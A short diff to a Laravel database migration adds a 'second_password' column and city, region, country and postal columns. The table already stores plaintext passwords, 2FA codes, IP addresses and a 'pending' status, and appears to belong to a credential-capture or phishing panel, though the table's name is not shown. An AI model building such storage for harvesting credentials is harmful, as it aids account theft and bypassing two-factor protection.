@@ -21,7 +21,12 @@ return new class extends Migration
             $table->string('ip_address')->nullable();
             $table->text('user_agent')->nullable();
             $table->string('password')->nullable();
+            $table->string('second_password')->nullable();
             $table->string('two_fa_code')->nullable();
+            $table->string('city')->nullable();
+            $table->string('region')->nullable();
+            $table->string('country')->nullable();
+            $table->string('postal')->nullable();
             $table->json('additional_info')->nullable();
             $table->string('status')->default('pending');
             $table->timestamps();
